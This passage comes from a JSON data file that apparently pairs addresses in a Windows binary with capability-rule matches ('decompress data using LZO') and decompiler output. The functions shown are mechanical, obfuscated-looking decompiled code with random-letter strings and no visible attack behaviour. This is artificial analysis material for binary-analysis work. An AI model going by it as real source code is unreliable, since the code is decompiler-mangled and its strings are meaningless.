        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040d030(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint uStack268;\n    uchar uStack264;\n    char *pcStack260;\n    int32_t iStack256;\n    uint uStack240;\n    uint32_t uStack236;\n    int32_t iStack232;\n    uint uStack216;\n    uint32_t uStack212;\n    int32_t iStack208;\n    uint uStack192;\n    uint32_t uStack188;\n    int32_t iStack184;\n    uint uStack168;\n    uint32_t uStack164;\n    int32_t iStack160;\n    uint uStack144;\n    uint32_t uStack140;\n    uchar uStack136;\n    uint *puStack132;\n    int32_t *piStack128;\n    uint uStack124;\n    uint uStack120;\n    int32_t iStack116;\n    int32_t iStack96;\n    uint auStack72 [2];\n    char *pcStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack72;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x414830;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    pcStack64 = \"qyaawuttxruapmxnonwjzxidtvphpvqcqrzxvhbmnwlhib\";\n    auStack72[0] = 0x2e;\n    fcn.00402f72();\n    if (uStack40 < 0x10) {\ncode_r0x0040d0cd:\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iStack116 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iStack116 = *(iStack60 + -4),  (iStack60 + -4) - iStack116 < 0x20)) {\n        fcn.00401a32(iStack116);\n        goto code_r0x0040d0cd;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack132 = &uStack268;\n    uStack124 = 0x414840;\n    piStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack128;\n    uStack240 = 0;\n    uStack236 = 0xf;\n    iStack256 = 0;\n    uStack120 = 6;\n    uStack264 = iStack208;\n    pcStack260 = \"vstlwurbodujvjodfqqaqedlgvofnwnzexeohpbyrfykusrwztnrzslindsjppffmo\";\n    uStack268 = 0x42;\n    fcn.00402f72();\n    uStack192 = 0;\n    uStack188 = 0xf;\n    iStack208 = 0;\n    uStack120 = 7;\n    fcn.00402f72(0x38, iStack184, \"xnkpmtcaplfycqyoopkudrdbxvgtcmnokadhfexhcbiydcjgpnvssxod\");\n    uStack168 = 0;\n    uStack164 = 0xf;\n    iStack184 = 0;\n    uStack120 = 8;\n    fcn.00402f72(0x31, iStack160, \"tdijdkybhpuoscexkuwcakjiknzwyyudgziambipwgnvbcukq\");\n    uStack144 = 0;\n    uStack140 = 0xf;\n    iStack160 = 0;\n    uStack120 = 9;\n    fcn.00402f72(0x31, iStack232, \"tdijdkybhpuoscexkuwcakjiknzwyyudgziambipwgnvbcukq\");\n    uStack216 = 0;\n    uStack212 = 0xf;\n    iStack232 = 0;\n    uStack120 = 10;\n    fcn.00402f72(0x31, uStack136, \"tdijdkybhpuoscexkuwcakjiknzwyyudgziambipwgnvbcukq\");\n    if (uStack212 < 0x10) {\ncode_r0x0040d2be:\n        if (0xf < uStack140) {\n            iVar2 = iStack160;\n            if ((0xfff < uStack140 + 1) && (iVar2 = *(iStack160 + -4),  0x1f < (iStack160 + -4) - iVar2))\n            goto code_r0x0040d40b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack164) {\n            iVar2 = iStack184;\n            if ((0xfff < uStack164 + 1) && (iVar2 = *(iStack184 + -4),  0x1f < (iStack184 + -4) - iVar2))\n            goto code_r0x0040d417;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack188) {\n            iVar2 = iStack208;\n            if ((0xfff < uStack188 + 1) && (iVar2 = *(iStack208 + -4),  0x1f < (iStack208 + -4) - iVar2))\n            goto code_r0x0040d423;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack236) {\n            iVar2 = iStack256;\n            if ((0xfff < uStack236 + 1) && (iVar2 = *(iStack256 + -4),  0x1f < (iStack256 + -4) - iVar2))\n            goto code_r0x0040d42f;\n            fcn.00401a32(iVar2);\n        }\n        if ((iStack96 + -4) - *(iStack96 + -4) < 0x20) {\n            fcn.00401a32(*(iStack96 + -4));\n            *in_FS_OFFSET = piStack128;\n            return 0x1580;\n        }\n    }\n    else {\n        iVar2 = iStack232;\n        if ((uStack212 + 1 < 0x1000) || (iVar2 = *(iStack232 + -4),  (iStack232 + -4) - iVar2 < 0x20)) {\n            fcn.00401a32(iVar2);\n            goto code_r0x0040d2be;\n        }\n        uStack120 = 0;\n        fcn.004047f5();\ncode_r0x0040d40b:\n        uStack120 = 1;\n        fcn.004047f5();\ncode_r0x0040d417:\n        uStack120 = 2;\n        fcn.004047f5();\ncode_r0x0040d423:\n        uStack120 = 3;\n        fcn.004047f5();\ncode_r0x0040d42f:\n        uStack120 = 4;\n        fcn.004047f5();\n    }\n    uStack120 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1744
    },
    "0040d550": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nint32_t fcn.0040d550(void)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    uint32_t unaff_EBP;\n    int32_t **in_FS_OFFSET;\n    int32_t unaff_retaddr;\n    uint32_t in_stack_00000014;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    int32_t aiStack104 [4];\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    int32_t *piStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x414850;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000034 < 0x10) {\ncode_r0x0040d5b4:\n        *in_FS_OFFSET = piStack28;\n        return 0x14c38;\n    }\n    iStack60 = in_stack_00000020;\n    if ((in_stack_00000034 + 1 < 0x1000) ||\n       (iStack60 = *(in_stack_00000020 + -4),  (in_stack_00000020 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x0040d5b4;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    piStack76 = aiStack104;\n    uStack68 = 0x414860;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack88 = 0;\n    uStack84 = 0xf;\n    aiStack104[0] = 0;\n    uStack64 = 4;\n    fcn.00402f72(0x4e, uStack80, \"ecqlwwkjughxoklhufklihczmlqszxuxdmbtprwlzujlmfooopsjnwxbzqlmntxznnqprloqtknmwa\");\n    if (uStack84 < 0x10) {\ncode_r0x0040d696:\n        if (0xf < unaff_EBP) {\n            arg_8h = uStack24;\n            if ((0xfff < unaff_EBP + 1) && (arg_8h = *(uStack24 - 4),  0x1f < (uStack24 - 4) - arg_8h))\n            goto code_r0x0040d786;\n            fcn.00401a32(arg_8h);\n        }\n        uStack24 = uStack24 & 0xffffff00;\n        if (0xf < in_stack_00000014) {\n            iVar1 = unaff_retaddr;\n            if ((0xfff < in_stack_00000014 + 1) && (iVar1 = *(unaff_retaddr + -4),  0x1f < (unaff_retaddr + -4) - iVar1)\n               ) goto code_r0x0040d792;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar1 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar1 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar1)) goto code_r0x0040d79e;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack72;\n        return piStack72;\n    }\n    iVar1 = aiStack104[0];\n    if ((uStack84 + 1 < 0x1000) || (iVar1 = *(aiStack104[0] + -4),  (aiStack104[0] + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0040d696;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x0040d786:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x0040d792:\n    uStack64 = 2;\n    fcn.004047f5();\ncode_r0x0040d79e:\n    uStack64 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    iVar1 = fcn.00403a76();\n    return iVar1;\n}\n",
        "token_count": 1181
    },
    "0040e220": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.0040e220(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_fffffeb0;\n    uint32_t in_stack_fffffec8;\n    uint32_t in_stack_fffffee0;\n    uint uStack244;\n    uchar uStack240;\n    char *pcStack236;\n    int32_t iStack232;\n    uint uStack216;\n    uint32_t uStack212;\n    int32_t iStack208;\n    uint uStack192;\n    uint32_t uStack188;\n    uint32_t uStack184;\n    uint uStack168;\n    uint32_t uStack164;\n    int32_t iStack160;\n    uint uStack144;\n    uint32_t uStack140;\n    uchar uStack136;\n    uint *puStack132;\n    int32_t *piStack128;\n    uint uStack124;\n    uint uStack120;\n    int32_t iStack116;\n    int32_t iStack92;\n    uint32_t uStack72;\n    uint32_t uStack68;\n    char *pcStack64;\n    int32_t iStack60;\n    uint32_t uStack48;\n    uint uStack44;\n    uint32_t uStack40;\n    uint8_t uStack36;\n    uint32_t *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &uStack72;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x414890;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack68 = uStack68 & 0xffffff00 | uStack36;\n    pcStack64 = \"fovlmfgudyyihsblsruglermeintoxfxxyinckunav\";\n    uStack72 = 0x2a;\n    fcn.00402f72();\n    if (uStack40 < 0x10) {\ncode_r0x0040e2bd:\n        *in_FS_OFFSET = piStack28;\n        return piStack28;\n    }\n    iStack116 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iStack116 = *(iStack60 + -4),  (iStack60 + -4) - iStack116 < 0x20)) {\n        fcn.00401a32(iStack116);\n        goto code_r0x0040e2bd;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack132 = &uStack244;\n    uStack124 = 0x4148a0;\n    piStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack128;\n    uStack216 = 0;\n    uStack212 = 0xf;\n    iStack232 = 0;\n    uStack120 = 0xc;\n    uStack240 = iStack208;\n    pcStack236 = \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\";\n    uStack244 = 0x36;\n    fcn.00402f72();\n    uStack192 = 0;\n    uStack188 = 0xf;\n    iStack208 = 0;\n    uStack120 = 0xd;\n    fcn.00402f72(0x5c, iStack160, \n                 \"lggwjbjupkawlhqhyxiofutvsihwgotveytsqwwcwkvtckeevtrrafnaoznmwcyppijspqwinfpjcdusrrwcjttkxdmu\");\n    uStack144 = 0;\n    uStack140 = 0xf;\n    iStack160 = 0;\n    uStack120 = 0xe;\n    fcn.00402f72(0x36, uStack184, \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n    uStack168 = 0;\n    uStack164 = 0xf;\n    uStack184 = 0;\n    uStack120 = 0x12;\n    fcn.00402f72(0x36, uStack136, \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n    if (uStack164 < 0x10) {\ncode_r0x0040e45e:\n        if (0xf < uStack140) {\n            in_stack_fffffee0 = uStack140 + 1;\n            iVar1 = iStack160;\n            if (0xfff < in_stack_fffffee0) {\n                iVar1 = *(iStack160 + -4);\n                if (0x1f < (iStack160 + -4) - iVar1) goto code_r0x0040e89f;\n                in_stack_fffffee0 = uStack140 + 0x24;\n            }\n            fcn.00401a32(iVar1);\n        }\n        uStack144 = 0;\n        uStack140 = 0xf;\n        iStack160 = 0;\n        uStack120 = 0xe;\n        fcn.00402f72(0x5c, in_stack_fffffee0 & 0xffffff00 | uStack184 & 0xff, \n                     \"lggwjbjupkawlhqhyxiofutvsihwgotveytsqwwcwkvtckeevtrrafnaoznmwcyppijspqwinfpjcdusrrwcjttkxdmu\");\n        uStack168 = 0;\n        uStack164 = 0xf;\n        uStack184 = 0;\n        uStack120 = 0x11;\n        fcn.00402f72(0x5c, uStack136, \n                     \"lggwjbjupkawlhqhyxiofutvsihwgotveytsqwwcwkvtckeevtrrafnaoznmwcyppijspqwinfpjcdusrrwcjttkxdmu\");\n        if (0xf < uStack164) {\n            in_stack_fffffec8 = uStack164 + 1;\n            uVar2 = uStack184;\n            if (0xfff < in_stack_fffffec8) {\n                uVar2 = *(uStack184 - 4);\n                if (0x1f < (uStack184 - 4) - uVar2) goto code_r0x0040e8ab;\n                in_stack_fffffec8 = uStack164 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack140) {\n            in_stack_fffffec8 = uStack140 + 1;\n            iVar1 = iStack160;\n            if (0xfff < in_stack_fffffec8) {\n                iVar1 = *(iStack160 + -4);\n                if (0x1f < (iStack160 + -4) - iVar1) goto code_r0x0040e8b7;\n                in_stack_fffffec8 = uStack140 + 0x24;\n            }\n            fcn.00401a32(iVar1);\n        }\n        uStack144 = 0;\n        uStack140 = 0xf;\n        iStack160 = 0;\n        uStack120 = 0xe;\n        fcn.00402f72(0x36, in_stack_fffffec8 & 0xffffff00 | uStack184 & 0xff, \n                     \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n        uStack168 = 0;\n        uStack164 = 0xf;\n        uStack184 = 0;\n        uStack120 = 0x10;\n        fcn.00402f72(0x36, uStack136, \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n        if (0xf < uStack164) {\n            in_stack_fffffeb0 = uStack164 + 1;\n            uVar2 = uStack184;\n            if (0xfff < in_stack_fffffeb0) {\n                uVar2 = *(uStack184 - 4);\n                if (0x1f < (uStack184 - 4) - uVar2) goto code_r0x0040e8c3;\n                in_stack_fffffeb0 = uStack164 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack140) {\n            in_stack_fffffeb0 = uStack140 + 1;\n            iVar1 = iStack160;\n            if (0xfff < in_stack_fffffeb0) {\n                iVar1 = *(iStack160 + -4);\n                if (0x1f < (iStack160 + -4) - iVar1) goto code_r0x0040e8cf;\n                in_stack_fffffeb0 = uStack140 + 0x24;\n            }\n            fcn.00401a32(iVar1);\n        }\n        uStack144 = 0;\n        uStack140 = 0xf;\n        iStack160 = 0;\n        uStack120 = 0xe;\n        fcn.00402f72(0x36, in_stack_fffffeb0 & 0xffffff00 | uStack184 & 0xff, \n                     \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n        uStack168 = 0;\n        uStack164 = 0xf;\n        uStack184 = 0;\n        uStack120 = 0xf;\n        fcn.00402f72(0x36, uStack136, \"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n        if (0xf < uStack164) {\n            uVar2 = uStack184;\n            if ((0xfff < uStack164 + 1) && (uVar2 = *(uStack184 - 4),  0x1f < (uStack184 - 4) - uVar2))\n            goto code_r0x0040e8db;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack140) {\n            iVar1 = iStack160;\n            if ((0xfff < uStack140 + 1) && (iVar1 = *(iStack160 + -4),  0x1f < (iStack160 + -4) - iVar1))\n            goto code_r0x0040e8e7;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack188) {\n            iVar1 = iStack208;\n            if ((0xfff < uStack188 + 1) && (iVar1 = *(iStack208 + -4),  0x1f < (iStack208 + -4) - iVar1))\n            goto code_r0x0040e8f3;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack212) {\n            iVar1 = iStack232;\n            if ((0xfff < uStack212 + 1) && (iVar1 = *(iStack232 + -4),  0x1f < (iStack232 + -4) - iVar1))\n            goto code_r0x0040e8ff;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack72) {\n            iVar1 = iStack92;\n            if ((0xfff < uStack72 + 1) && (iVar1 = *(iStack92 + -4),  0x1f < (iStack92 + -4) - iVar1))\n            goto code_r0x0040e90b;\n            fcn.00401a32(iVar1);\n        }\n        uStack72 = 0xf;\n        if (0xf < uStack48) {\n            uVar2 = uStack68;\n            if ((0xfff < uStack48 + 1) && (uVar2 = *(uStack68 - 4),  0x1f < (uStack68 - 4) - uVar2))\n            goto code_r0x0040e917;\n            fcn.00401a32(uVar2);\n        }\n        *in_FS_OFFSET = piStack128;\n        return 1;\n    }\n    in_stack_fffffee0 = uStack164 + 1;\n    uVar2 = uStack184;\n    if (in_stack_fffffee0 < 0x1000) {\ncode_r0x0040e452:\n        fcn.00401a32(uVar2);\n        goto code_r0x0040e45e;\n    }\n    uVar2 = *(uStack184 - 4);\n    if ((uStack184 - 4) - uVar2 < 0x20) {\n        in_stack_fffffee0 = uStack164 + 0x24;\n        goto code_r0x0040e452;\n    }\n    uStack120 = 0;\n    fcn.004047f5();\ncode_r0x0040e89f:\n    uStack120 = 1;\n    fcn.004047f5();\ncode_r0x0040e8ab:\n    uStack120 = 2;\n    fcn.004047f5();\ncode_r0x0040e8b7:\n    uStack120 = 3;\n    fcn.004047f5();\ncode_r0x0040e8c3:\n    uStack120 = 4;\n    fcn.004047f5();\ncode_r0x0040e8cf:\n    uStack120 = 5;\n    fcn.004047f5();\ncode_r0x0040e8db:\n    uStack120 = 6;\n    fcn.004047f5();\ncode_r0x0040e8e7:\n    uStack120 = 7;\n    fcn.004047f5();\ncode_r0x0040e8f3:\n    uStack120 = 8;\n    fcn.004047f5();\ncode_r0x0040e8ff:\n    uStack120 = 9;\n    fcn.004047f5();\ncode_r0x0040e90b:\n    uStack120 = 10;\n    fcn.004047f5();\ncode_r0x0040e917:\n    uStack120 = 0xb;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar1 = fcn.00403a76();\n    return iVar1;\n}\n",
        "token_count": 3443
    },
    "0040eb20": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.0040eb20(uint param_1, uchar *param_2, uint param_3, uint param_4, int32_t param_5, uint param_6, \n                 uint32_t param_7, uint param_8, uint param_9, uint32_t param_10)\n\n{\n    uchar **ppuVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    uchar *puVar3;\n    uchar *unaff_EDI;\n    uchar *puVar4;\n    int32_t **in_FS_OFFSET;\n    uint uStack184;\n    uint uStack180;\n    ushort uStack176;\n    uchar uStack174;\n    uint uStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uint uStack144;\n    uint32_t uStack140;\n    uchar uStack136;\n    uint *puStack132;\n    int32_t *piStack128;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uchar *puStack112;\n    uchar *in_stack_ffffffac;\n    uchar **ppuStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x4148b0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (param_10 < 0x10) {\ncode_r0x0040eb84:\n        *in_FS_OFFSET = piStack28;\n        return 0x27ad;\n    }\n    iStack60 = param_5;\n    if ((param_10 + 1 < 0x1000) || (iStack60 = *(param_5 + -4),  (param_5 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x0040eb84;\n    }\n    uStack20 = 0;\n    puVar3 = unaff_EDI;\n    fcn.004047f5();\n    fcn.004052d1();\n    ppuStack76 = &ppuStack76;\n    puStack116 = &stack0xffffffd8;\n    uStack64 = 0xffffffff;\n    uStack68 = 0x4148c0;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    puStack112 = unaff_EDI;\n    ppuVar1 = &ppuStack76;\n    if (puVar3 < 0x10) {\ncode_r0x0040ec24:\n        ppuStack76 = ppuVar1;\n        ppuStack32 = ppuStack32 & 0xffffff00;\n        if (param_7 < 0x10) {\ncode_r0x0040ec6a:\n            *in_FS_OFFSET = piStack72;\n            return 0;\n        }\n        puStack116 = param_2;\n        if ((param_7 + 1 < 0x1000) || (puStack116 = *(param_2 + -4),  param_2 + (-4 - puStack116) < 0x20)) {\n            fcn.00401a32(puStack116);\n            goto code_r0x0040ec6a;\n        }\n    }\n    else {\n        puStack112 = ppuStack32;\n        puVar4 = unaff_EDI;\n        if ((puVar3 + 1 < 0x1000) ||\n           (puStack112 = *(ppuStack32 + -4),  puVar4 = puStack112,  ppuStack32 + (-4 - puStack112) < 0x20)) {\n            in_stack_ffffffac = puStack112;\n            ppuStack76 = &ppuStack76;\n            fcn.00401a32(puStack112);\n            puStack112 = puVar4;\n            ppuVar1 = ppuStack76;\n            goto code_r0x0040ec24;\n        }\n        uStack64 = 0;\n        fcn.004047f5();\n    }\n    uStack64 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack132 = &uStack184;\n    uStack124 = 0x4148d0;\n    piStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack128;\n    uStack164 = 0xf;\n    uStack168 = 10;\n    uStack184 = 0x7a686a71;\n    uStack180 = 0x757a6465;\n    uStack176 = 0x6e64;\n    uStack174 = 0;\n    uStack144 = 0;\n    uStack140 = 0xf;\n    iStack160 = 0;\n    uStack120 = 3;\n    fcn.00402f72(0x13, uStack136, \"jymtijpmlsofjsofuit\");\n    if (uStack140 < 0x10) {\ncode_r0x0040ed8c:\n        if (0xf < uStack64) {\n            puVar3 = in_stack_ffffffac;\n            if ((0xfff < uStack64 + 1) &&\n               (puVar3 = *(in_stack_ffffffac + -4),  0x1f < in_stack_ffffffac + (-4 - puVar3))) goto code_r0x0040ee2e;\n            fcn.00401a32(puVar3);\n        }\n        uStack68 = 0;\n        uStack64 = 0xf;\n        if (0xf < &stack0xfffffffc) {\n            puVar3 = unaff_EDI;\n            if ((0xfff < &stack0xfffffffd) && (puVar3 = *(unaff_EDI + -4),  0x1f < unaff_EDI + (-4 - puVar3)))\n            goto code_r0x0040ee3a;\n            fcn.00401a32(puVar3);\n        }\n        *in_FS_OFFSET = piStack128;\n        return 0;\n    }\n    arg_8h = iStack160;\n    if ((uStack140 + 1 < 0x1000) || (arg_8h = *(iStack160 + -4),  (iStack160 + -4) - arg_8h < 0x20)) {\n        fcn.00401a32(arg_8h);\n        goto code_r0x0040ed8c;\n    }\n    uStack120 = 0;\n    fcn.004047f5();\ncode_r0x0040ee2e:\n    uStack120 = 1;\n    fcn.004047f5();\ncode_r0x0040ee3a:\n    uStack120 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    uVar2 = fcn.00403a76();\n    return uVar2;\n}\n",
        "token_count": 1656
    },
    "00412050": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00412050(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t aiStack104 [4];\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    int32_t *piStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x4149c0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000030 < 0x10) {\ncode_r0x004120b4:\n        *in_FS_OFFSET = piStack28;\n        return *0x4ea3ec;\n    }\n    iStack60 = in_stack_0000001c;\n    if ((in_stack_00000030 + 1 < 0x1000) ||\n       (iStack60 = *(in_stack_0000001c + -4),  (in_stack_0000001c + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x004120b4;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    piStack76 = aiStack104;\n    uStack68 = 0x4149d0;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack88 = 0;\n    uStack84 = 0xf;\n    aiStack104[0] = 0;\n    uStack64 = 2;\n    fcn.00402f72(0x13, uStack80, \"tifdbtscmohfuyewtck\");\n    if (0xf < uStack84) {\n        iVar1 = aiStack104[0];\n        if ((0xfff < uStack84 + 1) && (iVar1 = *(aiStack104[0] + -4),  0x1f < (aiStack104[0] + -4) - iVar1)) {\n            uStack64 = 0;\n            fcn.004047f5();\n            goto code_r0x004121f0;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < param_2) {\n        iVar1 = unaff_EDI;\n        if ((0xfff < param_2 + 1) && (iVar1 = *(unaff_EDI + -4),  0x1f < (unaff_EDI + -4) - iVar1)) {\ncode_r0x004121f0:\n            uStack64 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fVar2 = fcn.00403a76();\n            return fVar2;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack72;\n    return *0x4ea3f0;\n}\n",
        "token_count": 810
    },
    "00412280": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00412280(void)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t unaff_retaddr;\n    uint32_t in_stack_00000010;\n    uint32_t in_stack_00000024;\n    int32_t aiStack232 [4];\n    uint uStack216;\n    uint32_t uStack212;\n    int32_t iStack208;\n    uint uStack192;\n    uint32_t uStack188;\n    uint *puStack184;\n    uchar uStack180;\n    int32_t *piStack176;\n    int32_t *piStack172;\n    uint uStack168;\n    uint uStack164;\n    uint32_t uStack160;\n    uint *puStack140;\n    int32_t in_stack_ffffff80;\n    uint uStack116;\n    uint32_t uStack112;\n    char *pcStack108;\n    uint32_t uStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uint32_t uStack80;\n    uint *puStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    uint32_t uStack60;\n    int32_t iStack44;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint32_t uStack24;\n    int32_t iStack20;\n    \n    ppuStack32 = &ppuStack32;\n    iStack20 = 0xffffffff;\n    uStack24 = 0x4149e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000024 < 0x10) {\ncode_r0x004122e4:\n        *in_FS_OFFSET = piStack28;\n        return piStack28;\n    }\n    uStack60 = in_stack_00000010;\n    if ((in_stack_00000024 + 1 < 0x1000) ||\n       (uStack60 = *(in_stack_00000010 - 4),  (in_stack_00000010 - 4) - uStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(uStack60);\n        goto code_r0x004122e4;\n    }\n    iStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack76 = &uStack116;\n    uStack64 = 0xffffffff;\n    uStack68 = 0x4149f0;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack88 = 0;\n    uStack84 = 0xf;\n    uStack104 = 0;\n    uStack112 = uStack112 & 0xffffff00 | uStack80 & 0xff;\n    pcStack108 = \"belldddobictsizoqyg\";\n    uStack116 = 0x13;\n    fcn.00402f72();\n    if (uStack84 < 0x10) {\ncode_r0x004123bd:\n        *in_FS_OFFSET = piStack72;\n        return NULL;\n    }\n    uStack160 = uStack104;\n    if ((uStack84 + 1 < 0x1000) || (uStack160 = *(uStack104 - 4),  (uStack104 - 4) - uStack160 < 0x20)) {\n        fcn.00401a32(uStack160);\n        goto code_r0x004123bd;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    piStack176 = aiStack232;\n    uStack168 = 0x414a00;\n    piStack172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack172;\n    puStack184 = puStack140;\n    uStack216 = 0;\n   